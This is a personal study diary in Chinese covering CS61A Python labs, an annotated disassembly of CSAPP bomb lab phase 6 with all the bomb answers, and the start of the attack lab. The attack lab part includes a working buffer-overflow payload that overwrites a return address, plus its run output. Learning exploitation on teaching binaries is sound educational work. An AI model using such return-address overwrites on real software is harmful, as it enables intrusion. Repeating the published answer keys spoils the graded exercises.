## 5.4

要开启新的5月份旅途了！

开始lab05！

python的`append`和`extend`

- `append` 方法用于在列表末尾添加一个元素
- `extend` 方法用于在列表末尾一次性添加另一个序列中的所有元素。

记录下`for`循环中的修改循环变量问题：

在 Python 中，通常不建议在循环体内直接修改循环变量，因为这可能会导致逻辑混乱或者意外的结果。循环变量 `i` 在 `for` 循环中是由迭代器生成的，修改它可能会影响循环的行为。

现在我写的错误代码为：

```py
def insert_items(s, before, after):
    """Insert after into s after each occurrence of before and then return s.

    >>> test_s = [1, 5, 8, 5, 2, 3]
    >>> new_s = insert_items(test_s, 5, 7)
    >>> new_s
    [1, 5, 7, 8, 5, 7, 2, 3]
    >>> test_s
    [1, 5, 7, 8, 5, 7, 2, 3]
    >>> new_s is test_s
    True
    >>> double_s = [1, 2, 1, 2, 3, 3]
    >>> double_s = insert_items(double_s, 3, 4)
    >>> double_s
    [1, 2, 1, 2, 3, 4, 3, 4]
    >>> large_s = [1, 4, 8]
    >>> large_s2 = insert_items(large_s, 4, 4)
    >>> large_s2
    [1, 4, 4, 8]
    >>> large_s3 = insert_items(large_s2, 4, 6)
    >>> large_s3
    [1, 4, 6, 4, 6, 8]
    >>> large_s3 is large_s
    True
    """
    "*** YOUR CODE HERE ***"
    """
        解决思路：
            1. for遍历序列s，查询是否存在等于before的值
            2. e == before, 将after插入到e后面
            3. 索引跳到插入的after值后面
    """
    for i in range(len(s)+1):
        if s[i] == before:
            s.insert(i+1, after)
            i = i + 2
    return s
```

我想要索引略过新插入的after值 ，但是不了解循环变量 `i` 在 `for` 循环中是由迭代器生成的，不能随便修改for循环中的索引i。

这样的结果就是即使在判断中修改了`i`的值，但是回到循环迭代给`i`赋值的阶段，`i`又会重新被迭代器生成的值赋值，所以达不到`i+2`的结果。

所以直接用`while`：

```py
def insert_items(s, before, after):
	i = 0
    while  i < len(s):
        if s[i] == before:
            s.insert(i+1, after)
            i = i + 1
        i += 1
    return s
```

bomblab phase6：

```assembly
=> 0x00000000004010f4 <+0>:     push   %r14
   0x00000000004010f6 <+2>:     push   %r13
   0x00000000004010f8 <+4>:     push   %r12
   0x00000000004010fa <+6>:     push   %rbp
   0x00000000004010fb <+7>:     push   %rbx
   0x00000000004010fc <+8>:     sub    $0x50,%rsp
   0x0000000000401100 <+12>:    mov    %rsp,%r13					#int *r13 = rsp
   0x0000000000401103 <+15>:    mov    %rsp,%rsi
   0x0000000000401106 <+18>:    call   0x40145c <read_six_numbers> #num1 - num6
   0x000000000040110b <+23>:    mov    %rsp,%r14				   #int *r14 = num1 = *rsp
   0x000000000040110e <+26>:    mov    $0x0,%r12d					# int i(r12d) = 0
   0x0000000000401114 <+32>:    mov    %r13,%rbp					# int *rbp = rsp
   0x0000000000401117 <+35>:    mov    0x0(%r13),%eax				# int eax = num1
   0x000000000040111b <+39>:    sub    $0x1,%eax					# if (rsp[0] <= 6)
   0x000000000040111e <+42>:    cmp    $0x5,%eax
   0x0000000000401121 <+45>:    jbe    0x401128 <phase_6+52>
   0x0000000000401123 <+47>:    call   0x40143a <explode_bomb>
   
   #<+0>- <+47>:输入的6个值均小于等于6
   0x0000000000401128 <+52>:    add    $0x1,%r12d					#i ++  (i = 1)
   0x000000000040112c <+56>:    cmp    $0x6,%r12d					# cmp 6 and i
   0x0000000000401130 <+60>:    je     0x401153 <phase_6+95>
  					
  					# if(i < 6)
   0x0000000000401132 <+62>:    mov    %r12d,%ebx				# int ebx = i (ebx = 1)
   0x0000000000401135 <+65>:    movslq %ebx,%rax				# Move sign-extended double word to quad word	
   																# rax = 1
   0x0000000000401138 <+68>:    mov    (%rsp,%rax,4),%eax		# rax = rsp[1]
   0x000000000040113b <+71>:    cmp    %eax,0x0(%rbp)			# if(rsp[1] != rsp[0])		
   0x000000000040113e <+74>:    jne    0x401145 <phase_6+81>
   0x0000000000401140 <+76>:    call   0x40143a <explode_bomb>
   					# rsp[1] != rsp[0]
   0x0000000000401145 <+81>:    add    $0x1,%ebx				# ebx += 1(ebx = 2)
   0x0000000000401148 <+84>:    cmp    $0x5,%ebx				# ebx <= 5
   0x000000000040114b <+87>:    jle    0x401135 <phase_6+65>
   #<+62> - <+87>分析：遍历输入的6个数据，判断是否后五个均不等于num[0]
   
   
   0x000000000040114d <+89>:    add    $0x4,%r13				# *r13 = rsp + 1
   0x0000000000401151 <+93>:    jmp    0x401114 <phase_6+32>
   #<+32> - <+93>：判断是否输入的所有数字均小于等于6，且互不相等
   
   
   					# if(i == 6) 此时满足的条件是：输入的所有数字均小于等于6，且互不相等
   0x0000000000401153 <+95>:    lea    0x18(%rsp),%rsi		# int *rsi = rsp + 6	(24 / 4 = 6 words) = 0
   0x0000000000401158 <+100>:   mov    %r14,%rax			# int *rax = rsp
   0x000000000040115b <+103>:   mov    $0x7,%ecx			# int ecx = 7
   0x0000000000401160 <+108>:   mov    %ecx,%edx			# edx = 7
   0x0000000000401162 <+110>:   sub    (%rax),%edx			# edx = 7 - rsp[0]
   0x0000000000401164 <+112>:   mov    %edx,(%rax)			# *rsp = 7 - rsp[0]
   0x0000000000401166 <+114>:   add    $0x4,%rax			# rax = rsp + 1(*rax = rsp[1])
   0x000000000040116a <+118>:   cmp    %rsi,%rax			# 指针 rax 索引rsp到rsp+5的6个输入数字
   0x000000000040116d <+121>:   jne    0x401160 <phase_6+108>
   #<+95> - <+121>：指针rax索引输入的6个数字，并且重新赋值为num[i] = 7-num[i]
   
   
# ------------------- 将rsp[i]重新赋值为7 - rsp[i]------------------

   0x000000000040116f <+123>:   mov    $0x0,%esi				# int rsi = 0
   0x0000000000401174 <+128>:   jmp    0x401197 <phase_6+163>
   																# eax = 1, *edx = 0x6032d0
   0x0000000000401176 <+130>:   mov    0x8(%rdx),%rdx			# rdx = mem(0x6032d0 + 8) = 6304480
   0x000000000040117a <+134>:   add    $0x1,%eax				# eax ++ (eax = 2)
   0x000000000040117d <+137>:   cmp    %ecx,%eax				# compare eax and ecx(rsp[0])
   0x000000000040117f <+139>:   jne    0x401176 <phase_6+130>	# if eax != rsp[0]: eax ++
   0x0000000000401181 <+141>:   jmp    0x401188 <phase_6+148>	#	此时一定满足rax == rsp[0]


						#if(rsp[i] <= 1)
   0x0000000000401183 <+143>:   mov    $0x6032d0,%edx			# int *edx = 0x6032d0(*edx = 332)
   0x0000000000401188 <+148>:   mov    %rdx,0x20(%rsp,%rsi,2)	# 8（32bytes = 8words--int） + rsp + 2 * rsi = 0x6032d0
   #在40118d打断点，调试可以确认每次将rsp[8+2i]赋值什么了
   
   0x000000000040118d <+153>:   add    $0x4,%rsi				# rsi + 1
   0x0000000000401191 <+157>:   cmp    $0x18,%rsi				# rsi and 6
   0x0000000000401195 <+161>:   je     0x4011ab <phase_6+183>
   
   0x0000000000401197 <+163>:   mov    (%rsp,%rsi,1),%ecx		# ecx = rsp[rsi] 
   0x000000000040119a <+166>:   cmp    $0x1,%ecx				# compare rsp[rsi] and 1 
   0x000000000040119d <+169>:   jle    0x401183 <phase_6+143>	
   # <+143> - <+169>:如果7-num[i]小于等于1，则将给rsp+8(32 = 0x20)、10(40 = 0x28)、12(48 = 0x30)、14(56 = 0x38)、16(64 = 0x40)、18赋值
   # 为0x6032d0
   
   						#if(rsp[i] > 1)
   0x000000000040119f <+171>:   mov    $0x1,%eax				# int eax = 1
   0x00000000004011a4 <+176>:   mov    $0x6032d0,%edx			# int *edx = 0x6032d0
   0x00000000004011a9 <+181>:   jmp    0x401176 <phase_6+130>
   
   
   0x00000000004011ab <+183>:   mov    0x20(%rsp),%rbx			# rbx = rsp[8]
   0x00000000004011b0 <+188>:   lea    0x28(%rsp),%rax			# rax = rsp + 10
   0x00000000004011b5 <+193>:   lea    0x50(%rsp),%rsi			# rsi = rsp + 20
   0x00000000004011ba <+198>:   mov    %rbx,%rcx				# rcx = rsp[8]
   0x00000000004011bd <+201>:   mov    (%rax),%rdx				# rdx = rsp[10]
   0x00000000004011c0 <+204>:   mov    %rdx,0x8(%rcx)			# *(rcx + 0x8) = rsp[10]
   0x00000000004011c4 <+208>:   add    $0x8,%rax				# rax = rsp + 10 + 2
   0x00000000004011c8 <+212>:   cmp    %rsi,%rax				# if rax != rsp+20
   
   0x00000000004011cb <+215>:   je     0x4011d2 <phase_6+222>
   0x00000000004011cd <+217>:   mov    %rdx,%rcx				# rcx = rsp[10]
   0x00000000004011d0 <+220>:   jmp    0x4011bd <phase_6+201>
   # <+183> - <+220>:不知道做了什么，应该是将rsp[10]、rsp[12]、...、rsp[18]的所有值，赋值给
   
   						# if rax == rsp+20
   						# 跳出循环时，rax=rsp+20,rdx = *(rsp+18),rbx = *(rsp + 8)
   0x00000000004011d2 <+222>:   movq   $0x0,0x8(%rdx)
   0x00000000004011da <+230>:   mov    $0x5,%ebp
   0x00000000004011df <+235>:   mov    0x8(%rbx),%rax	# rax = *(rsp[8] + 2);//链表指针域
   0x00000000004011e3 <+239>:   mov    (%rax),%eax		# rax = *(rax);//rax 为node->next
   0x00000000004011e5 <+241>:   cmp    %eax,(%rbx)	# 下一个节点 和 此节点 的低32位数据进行比对		
   0x00000000004011e7 <+243>:   jge    0x4011ee <phase_6+250>	# 保证当前节点的低32位数据要大于下一节点的低32位数据
   
   0x00000000004011e9 <+245>:   call   0x40143a <explode_bomb>
   0x00000000004011ee <+250>:   mov    0x8(%rbx),%rbx
   0x00000000004011f2 <+254>:   sub    $0x1,%ebp
   0x00000000004011f5 <+257>:   jne    0x4011df <phase_6+235>
   0x00000000004011f7 <+259>:   add    $0x50,%rsp
   0x00000000004011fb <+263>:   pop    %rbx
   0x00000000004011fc <+264>:   pop    %rbp
   0x00000000004011fd <+265>:   pop    %r12
   0x00000000004011ff <+267>:   pop    %r13
   0x0000000000401201 <+269>:   pop    %r14
   0x0000000000401203 <+271>:   ret
```

## 5.5

将汇编语言反汇编为C伪代码后：

```C
phase_6(char *str){
    int *rsp = read_six_numbers(str);//rsp[0] = input[0] ---> rsp[5] = input[5]
    for(int i = 0; i < 6; i++){
        //输入数字均小于等于6，且所有数字均不相同
        for(int j = i + 1; j < 6; j++){
            if(rsp[i] > 6 || rsp[j] == rsp[i]){
                return explode_bomb();
            }
        }		
    }
	
	//将所有数字置为7减去自身
	for(int i = 0; i < 6; i++){
		rsp[i] = 7 - rsp[i];
	}
	
	int i = 0;
		
	//rsp[8]、rsp[10]、rsp[12]、rsp[14]、rsp[16]、rsp[18]均会被赋值
	while(i < 6){
		if(rsp[i] <= 1){//7-rsp[i] and 1//	num[i] >= 6
			rsp[8 + 2*i] = 0x6032d0;
		}else{
			int eax = 1;
			int edx = 0x6032d0;
			do{
				//edx = 2：0x006032e0，3：0x006032f0，4：0x00603300，5：0x00603310，6：0x00603320
				edx = *(edx + 0x8);
				eax++;
			}while(eax != rsp[i]);
			//rax == rsp[i]
			rsp[8 + 2*i] = edx;
		}
		i++;
	}
	//修改node节点的指针域
	int rbx = rsp[8]; 	//存储的是链表节点位置/指针域
	int *rax = rsp + 10;
	int *rsi = rsp + 20;//边界
	do{
		// *(rsp[8] + 2) = rsp[10]
		// *(rsp[10] + 2) = rsp[12]
		/* ....
		   *(rsp[16] + 2) = rsp[18]
		*/
		int rcx = rbx;
		int rdx = *rax;
		*(rbx + 2) = *(rax);//修改链表的指针域
		rax = rax + 2;
		&rbx ++;
	}while(rax < rsi);
	
    //判断rsp[8]到rsp[18]所指的节点，值域是否均后一个大于前一个
	//跳出循环时，rax=rsp+20,rdx = *(rsp+18),rbx = *(rsp + 8)
    //rax            0x7fffffffe0b0 == rsp+20
    //rbx            0x603320       == *(rsp + 8)
	//rcx            0x6032e0            6304480
	//rdx            0x6032d0       == *(rsp+18)

	rdx = rsp[18];
	rbx = rsp[8]
	*(rsp[18] + 2) = 0;
	ebp = 5;
    while(ebp != 0){
        rax = *(rsp[8] + 2);//链表指针域
		rax = *(rax);		//将此节点给指针rax
		if(*(rbx) >= rax){//将前一节点（*(rbx)）和后一个节点的值（猜测为值域:哪里为值域）进行比较
			rbx = *(rsp[8] + 2);//rbx指向链表的下一个节点
		//这里保证了修改完指针域后的链表，前一个节点的值要大于后一个节点的值
		}
        ebp--;
    }

	
}
```

补充`0x6032d0`处的数据：

```assembly
(gdb) x/24xw 0x6032d0
0x6032d0 <node1>:       0x0000014c      0x00000001      0x006032e0      0x00000000
0x6032e0 <node2>:       0x000000a8      0x00000002      0x006032f0      0x00000000
0x6032f0 <node3>:       0x0000039c      0x00000003      0x00603300      0x00000000
0x603300 <node4>:       0x000002b3      0x00000004      0x00603310      0x00000000
0x603310 <node5>:       0x000001dd      0x00000005      0x00603320      0x00000000
0x603320 <node6>:       0x000001bb      0x00000006      0x00000000      0x00000000
```

可以看出这是一个链表结构，长度为6，依次存储1到6的值。

经过分析：

1. rsp[8]到rsp[18]保存的是以0x6032d0开头的链表地址
2. 最后一步判断条件，保证修改完指针域后的链表，前一个节点的值要大于后一个节点的值
3. 打印0x6032d0处的数据可以看出，若想值域从大到小排列，那就需要rsp[8]指向结构：node3 -> node4 -> node5 -> node6 -> node1 -> node2。
4. 等日后再分析吧，今晚很累

最终答案为：

```tex
Border relations with Canada have never been better.
1 2 4 8 16 32
2 707
7 0
9on567
4 3 2 1 6 5
```

晚安。

## 5.6

重新回顾`lambda`表达式。

```py
     lambda            x            :          f(g(x))
"A function that    takes x    and returns     f(g(x))"
```

**disc6**

获取大于2024的斐波那契数：

生成大于2024斐波那契数的生成器：`filter(lambda n: n > 2024, gen_fib())`

```python
def gen_fib():
    n, add = 0, 1
    while True:
        yield n
        n, add = n + add, n

next(filter(lambda n: n > 2024, gen_fib()))
```

分析：

- **filter**(*function*, *iterable*)： is equivalent to the generator expression `(item for item in iterable if function(item))`
- `filter()`函数将第一个判断n是否大于2024作为判断条件函数，将生成器函数`gen_fib()`作为可迭代值作为第二个参数，将返回一个迭代器。这个迭代器的作用就是获取大于2024的斐波那契数。
- The `filter` function returns an iterator over, `zip`, and `reversed` functions also return iterators.An iterator object is created that can return results if queried using `next`.

**Q2: Merge**

Write a generator function `merge` that takes in two infinite generators `a` and `b` that are in increasing order without duplicates and returns a generator that has all the elements of both generators, in increasing order, without duplicates.

问题抽象：按照递增序列排两个迭代器的值，并且不能重复

问题分析：

1. 获取两个迭代器的值：v1 = next(a), v2 = next(b)
2. 如果v1 < v2，则yield v1，随后v1 = next(a)
3. 如果v2 < v1，则yield v2，随后v2 = next(b)
4. 如果v1 = v2，则yield v1，随后v1 = next(a)并且v2 = next(b)

```py
def merge(a, b):
    """Q2:
    >>> def sequence(start, step):
    ...     while True:
    ...         yield start
    ...         start += step
    >>> a = sequence(2, 3) # 2, 5, 8, 11, 14, ...
    >>> b = sequence(3, 2) # 3, 5, 7, 9, 11, 13, 15, ...
    >>> result = merge(a, b) # 2, 3, 5, 7, 8, 9, 11, 13, 14, 15
    >>> [next(result) for _ in range(10)]
    [2, 3, 5, 7, 8, 9, 11, 13, 14, 15]
    """
    "*** YOUR CODE HERE ***"
        v1, v2 = next(a), next(b)
    while True:
      if v1 < v2:
          yield v1
          v1 = next(a)
      elif v2 < v1:
          yield v2
          v2 = next(b)
      else:
          yield v1
          v1 = next(a)
          v2 = next(b)
```

## 5.7

leave off：If something continues from where it left off, it starts happening again at the point where it had previously stopped.

feel so lonely,so you can make friends by some ways and do something to make you happy.

## 5.8

`min` 函数在处理字典时，默认情况下会基于字典的键进行比较，并返回具有最小键的键-值对（或者只返回最小的键，取决于具体用法）。`min` 函数的语法格式如下：

```py
min(iterable, key=None, default=...)
```

- `iterable`：要比较的可迭代对象，通常是字典的键或者键值对。
- `key`：可选参数，用于指定比较的关键字函数，类似于 `sorted` 函数中的 `key` 参数。
- `default`：可选参数，在可迭代对象为空时返回的默认值。

```py
coins = {2: 2, 3: 2, 4: 3, 5: 1}
smallest = min(coins)
```

这里的min函数是选出面额（key）最小的硬币。

得到了峰哥的信任，哥们尽量努力不辜负自己的时光。

今天状态不佳，请好好爱自己bro！(●'◡'●)

## 5.9

> ### Q3: Make Change
>
> Implement `make_change`, which takes a positive integer `amount` and a dictionary of `coins`. The `coins` dictionary keys are positive integer denominations and its values are positive integer coin counts. For example, `{1: 4, 5: 2}` represents four pennies and two nickels. The `make_change` function returns a list of coins that sum to `amount`, where the count of any denomination `k` in the return value is at most `coins[k]`.
>
> If there are multiple ways to make change for `amount`, prefer to use as many of the smallest coins available and place the smallest coins first in the returned list.

```py
def make_change(amount, coins):
    """Return a list of coins that sum to amount, preferring the smallest coins
    available and placing the smallest coins first in the returned list.

    The coins argument is a dictionary with keys that are positive integer
    denominations and values that are positive integer coin counts.

    >>> make_change(2, {2: 1})
    [2]
    >>> make_change(2, {1: 2, 2: 1})
    [1, 1]
    >>> make_change(4, {1: 2, 2: 1})
    [1, 1, 2]
    >>> make_change(4, {2: 1}) == None
    True

    >>> coins = {2: 2, 3: 2, 4: 3, 5: 1}
    >>> make_change(4, coins)
    [2, 2]
    >>> make_change(8, coins)
    [2, 2, 4]
    >>> make_change(25, coins)
    [2, 3, 3, 4, 4, 4, 5]
    >>> coins[8] = 1
    >>> make_change(25, coins)
    [2, 2, 4, 4, 5, 8]
    """
    if not coins:
        return None
    smallest = min(coins)
    rest = remove_one(coins, smallest)
    if amount < smallest:
        return None
    elif amount == smallest:	#base case
        return [smallest]
    else:
        result = make_change(amount-smallest, rest)
        # result == None: Unable to perform next split
        if result:
            return [smallest] + result
        else:
            return make_change(amount, rest)
```

开始attack lab:

- reference material for this lab:3.10.3 `Out-of-Bounds Memory References and Buffer Overflow`和3.10.4`Thwarting Buffer Overflow Attacks`

## 5.10

回顾昨天所学的lab06：

1. Q1: Bank Account：要想在account中记录存取钱的流水，需要单独定义一个交易流水类，这个类就是`Transaction`。用户每一次存取钱的时候，都实例化一个交易实例，并且将其存放在这个用户中。

2. Q2: Email：实现一个邮件传输的逻辑。A `Client` can `compose` an email, which it will `send` to the `Server`. The `Server` then delivers it to the `inbox` of another `Client`. To achieve this, a `Server` has a dictionary called `clients` that matches the `recipient_name` in an `Email` to the `Client` object with that name.

   用户可以创建邮件，邮件会自动发送到服务器。

   服务器会将邮件投递到对应收件人的收件箱中。这样服务器就需要有一个对应的用户字典：按照收件人名称来获取收件人的信息，从中获取到收件箱的地址并存放进去。

3. Q3: Make Change：输入一个总金额和手里的零钱字典（面额为key，数量为value），返回一个零钱凑数策略。这个策略需要保证最小面额零钱尽量多，且在列表展示中更靠前。

   解决思路：

   `make_change(amount, coins)`：返回一个硬币面额列表，总和恰好为总金额。

   - 拿一枚最小的面额硬币`smallest`去凑数，用总金额`amount`减去这个硬币的金额，得到剩余总金额`rest_amount`
   - 如果`rest_amount`恰好等于0，证明这个硬币面值`coin`刚好等于总金额`amount`，直接返回`[smallest]`。
   - 如果`rest_amount`小于0，则证明手中的最小面额零钱已经大于总金额了，此时不需要再继续给零钱，直接返回`None`
   - 如果`rest_amount`大于0，则在硬币字典中减去此面额`smallest`硬币一个数量，获得`rest_conis`；并且将剩余金额`rest_amount`作为`amount`，重新调用`make_change(amount, coins)`函数，并且获取返回值`result`。
     - 如果返回值`result`为`None`，则证明剩余金额已经无法被剩余硬币正常凑出，所以直接返回`make_change(amount, rest_conis)`，这样函数调用的时候会直接返回`None`
       - 如果返回值`result`不为`None`，那么证明剩余金额可以被剩余硬币正常凑出，并且返回一个硬币面额列表，此时直接返回`[smallest]+result`

   > 这里的walkthrough分析的很到位：
   >
   > The code for `make_change(amount, coins)` should do the following:
   >
   > 1. Check if `amount == smallest`, in which case return a one-element list containing just `smallest`.
   > 2. Otherwise, call `make_change(amount-smallest, rest)`, which returns either `None` or a list of numbers.
   > 3. If the call in Step 2 returned a list, then return a longer list that includes `smallest` at the front.
   > 4. If the call in Step 2 returned `None`, then there's no way to use the `smallest` coin, so just `make_change(amount, rest)`

刚才跟女朋友交流了一会病情，感觉很好，很喜欢😋

> ## Q4: Change Machine
>
> Complete the `change` method of the `ChangeMachine` class. A `ChangeMachine` instance holds some `coins`, which are initially all pennies. The `change` method takes a positive integer `coin`, adds that coin to its `coins`, and then returns a list that sums to `coin`. The machine prefers to return as many of the smallest coins available, ordered from smallest to largest. The coins returned by `change` are removed from the machine's `coins`.

q4里面关于方法`change`的描述有问题。返回一个列表，其和为`coin`的时候，同时将这个返回值列表从`coin`中删除了。而这里只是说返回值符合和值为`coin`，像是不想告诉大家似得，在后面偷偷补充了下这个返回值会被删除。

如果想考验阅读理解能力的话，那当我没话说。

那么分析下函数`def change(self, coin)`：

- 输入coin后，在此实例的属性`coins`的中添加此coin一个
- 查看`coins`中是否能用比此`coin`小的面额硬币，加起来替换掉这个`coin`
  - 如果存在，则删除这些小的硬币
  - 如果不存在，则删除刚加入的`coin`

具体实现：

```py
def change(self, coin):
    """Return change for coin, removing the result from self.coins."""
    "*** YOUR CODE HERE ***"
    # 如果能替换，则删除result，添加coin；如果不能，直接返回[coin]
    result = make_change(coin, self.coins)
    if result:
        dic_delete_list(self.coins, result)
        # 检查是否存在键 coin，如果不存在则插入并设置值为 1，如果存在则将值自增 1
        self.coins[coin] = self.coins.setdefault(coin, 0) + 1
    else:
        result = [coin]
    return result
```

用到的几个方法：

1. `dic_delete_list(main_dict, list)`删除字典中对应列表的元素：

   使用 `collections.Counter` 对象，它是 Python 标准库中的一个计数器工具，专门用于统计可迭代对象中元素的出现次数，并以字典的形式返回结果。

   ```py
   >>> from collections import Counter 
   >>> Counter(lio) 
   Counter({1: 3, 2: 2})
   >>> dict(Counter(lio)) 
   {1: 3, 2: 2}
   ```

   ```py
   def dic_delete_list(main_dict, list):
       # 将要删除的列表转为字典
       sub_dict = dict(Counter(list))
       # 计算减去子字典后的值
       for key in sub_dict:
           if key in main_dict:
               if main_dict[key] > sub_dict[key]:
                   main_dict[key] -= sub_dict[key]
               else:
                   del main_dict[key]
   ```

2. `setdefault(key, default)` 方法会检查字典中是否存在指定的键 `key`，如果存在则返回对应的值，如果不存在则将 `key` 插入字典并设置默认值 `default`。

一直以来都将github作为代码存放管理平台，今天下午学习下github怎么高效利用：

- 找想要了解的优质开源项目（跟自己学习有关的，然后优质的）
- folk并且提交代码进行合并

我想今年转C++，并且在南京附近能够月入2w。

然后就是自己的C++方向路线的只言片语：

> 贴吧用户_71yDAey： C++这条路，可不能只会C++，要的是整个计算机体系，尤其是网络
>
> [我他妈取名真难](http://c.tieba.baidu.com/home/main?id=tb.1.17156a27.vkUnmtW4-TVvJA2FRjQwtw&ie=utf-8&fr=pb): 老哥不急有我，部门组长叫我三天看完文档，这周跑通一个智能车代码。离谱的是比我先进来一个月的一个人组长叫他一周看完前三章文档，而我3天看完前五章文档，不说了，这几天代码已经看得我头皮发麻了
>
> 壹点点滴滴：三题一题都没写出来 因为我忘了stl操作的相应函数只记得底层原理 下午的面试c++问题都会 但是他后面问了几个mysql的问题 我就会索引 其他都没有答上来 还有http我也不会
>
> 期待：今天去体检了 然后弄一下离职证明 周一入职咯 希望一切顺利 现在完成第一个目标 找到月薪过万的工作 我的下一个目标是 两年内月薪超过2w
>
> 关于深入学习：经过上次被裁 我有了一些危机感 之前我还觉得我能在公司待很久 还在考虑考研或者深入学习技术 然后去看了计算机网络自顶向下这种原理书 导致我在应用上没有多大进步 我觉得还是要有一些危机感的 说实话 现在这家公司我都不知道能待多久 说不定试用期都未必能过 我现在觉得还是先学一些实用技术 以后有时间深入学习原理吧
>
> 现在加班有点猛 已经达到996的强度了 就没什么时间学习 不过我觉得我还是要尽可能抽出时间学习 因为不知道什么时候就被裁了 从上一次被裁后 我觉得我们还是要有危机感 提升自己 不要把希望全寄托在公司 指不定哪天公司就把你裁了
>
> 关于租房：换了个地方租房住 在公司附近 租房费用涨了一千 现在两千八一个月了 但是距离公司路程1分钟 很近很近 之前住的地方上下班总共要花费两个半小时 一个月就要花费五十多个小时在路上 我不太能接受 这时间用来学习多好啊 虽然我现在经济压力很大 但是我依旧要把时间花在学习上 而不是上下班通勤 青春无价 程序员职业生涯是短暂的 我要多花时间学习
>
> 关于困难：
>
> 问了一些人 还有一些up主 都不建议我走音视频 因为专升本在音视频领域很难找到工作 音视频对学历有要求 都建议我做qt/MFC这类客户端 比较好找工作 但是我现在就是做客户端 我感觉客户端没什么难度 天花板也比较低 问别人其实我只是想问问音视频对于学历要求高不高 并不会影响我走音视频道路 即使这条路很难 即使学历不够 我依旧要走这条路 下次跳槽 一定去音视频岗位 不为别的 就喜欢有难度有前景的岗位
>
> 随便这家公司很累 比之前累很多 但是不得不说 个人提升很快 我现在写的代码比之前好太多了 而且不仅仅是代码水平有提升 其他方面也有很大提升 我都感觉我之前被裁是一种幸运 在之前公司我没有什么提升
>
> 贴吧用户_7NMQVU1：加油楼主，记得当时你刚转码培训更新这个系列的时候也有很多人劝退你，你还是坚持下了，还做的很好，你的分享也鼓励到了不少人，觉得楼主是个很有决心执行力很强的人，希望楼主能圆梦
>
> 贴吧用户_aJAVyVy：去年11月工作时候刷贴吧就看到了楼主帖子，我当时和楼主一样也是刚入职待转正，不过我是c#，上位机。
> 去年我特辛苦就准备跳槽，如今清闲下来每天摸鱼混经验。时隔4个月再刷到楼主的续帖，有种照镜子的感觉，楼主这才是程序猿的精神，保持危机感，时刻观察市场，时刻学习技术。 我也立个flag，今年跳槽到南京的c++开发岗
>
> 关于胖猫：我不接：我是没有一丝同情的，唯一的同情的情感就是同情他贫瘠的精神世界，或者说他把这个女生作为自己的精神支柱。老哥的转行之路太励志了，加油

楼主很猛，能一天10h+的学习，心无旁骛的话很厉害。但是也有点急功近利，太着急反而静不下心去解决真正的问题。

博客园默认模式真的丑啊，想学习下如何改善博客园关于自己的博客界面逻辑。

ok，今晚浅尝下attacklab带来的快感。

# attacklab

### phase1

目标：想实现从`test()`函数劫持`getbuf()`的返回地址，使得调用getbuf获取输入后，直接跳转到目标地址执行`touch1()`。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
    Getbuf returned 0x%x\n", val);
 }
```

劫持后的函数`touch1()`：

```c
1 void touch1()
2 {
3   vlevel = 1;/* Part of validation protocol */
4   printf("Touch1!: You called touch1()\n");
5   validate(1);
6   exit(0);
7 }
```

Your task is to get `CTARGET` to execute the code for `touch1` when `getbuf` executes its return statement,rather than returning to test.

分析test的汇编代码：

这里可以用用`objdump -d ctarget > ctarget_raw.txt`产生汇编代码观察getbuf的行为，从而不用通过gdb动态调试来看反汇编的函数代码了。

```assembly
(gdb) disassemble test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    %eax,%edx
   0x0000000000401978 <+16>:    mov    $0x403188,%esi
   0x000000000040197d <+21>:    mov    $0x1,%edi
   0x0000000000401982 <+26>:    mov    $0x0,%eax
   0x0000000000401987 <+31>:    call   0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    $0x8,%rsp
   0x0000000000401990 <+40>:    ret
End of assembler dump.
```

在`<+9>:     call   0x4017a8 <getbuf>`，我们需要做的就是调用getbuf的时候，输入超长字符串，导致调用getbuf之前保存的返回地址替换为touch1的地址。这样让getbuf调用ret指令时候，会将替换后的地址作为 program counter（%rip）的值，从而实现控制转移。而touch1的地址为：0x4017c0

**确认超长字符串的内容：**

因为返回地址保存在getbuf开辟的地址之上，就需要看下函数getbuf开辟了多少空间：

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```

可以看出getbuf开辟了0x28（hex） = 40（dec）字节空间，所以可以推断出只要写40个字节的数据，就可以覆盖getbuf开辟的栈空间，并且将41个字节保存touch1的地址（64位数据void*），即可实现level1的要求。

按照8个字节为一个单位，需要5个单位的覆盖值，并且加一个单位的0x4017a8返回地址。这里利用自带的HEX2RAW程序来执行。

exploit.txt文件内容：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

```bash
unix> ./hex2raw < exploit.txt > exploit-raw.txt
unix> ./ctarget -q -i exploit-raw.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

不知道为什么用：

```
unix> cat exploit.txt | ./hex2raw | ./ctarget
```

就会报错，这是为什么呢？chatgpt给的答案是：

> 第一种方法（`cat exploit.txt | ./hex2raw | ./ctarget`）出错的可能原因与输入的处理方式或程序处理输入重定向和管道的方式有关。通过将输入预先转换为原始格式（`exploit-raw.txt`），你可以避开与管道相关的潜在问题。

管道？算了，不是研究重点，先放一下，二周目再来。

## 5.11（delete）

### phase2

> Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.

任务描述：让`CTARGET `执行`touch2`而不是重新执行`test`，而且`touch2`的入参是自己的cookie。

思路：

- 劫持执行地址我熟悉，同level1，将test调用getbuf之前保存的返回地址，由getbuf的下一行指令地址改为touch2的初始地址。
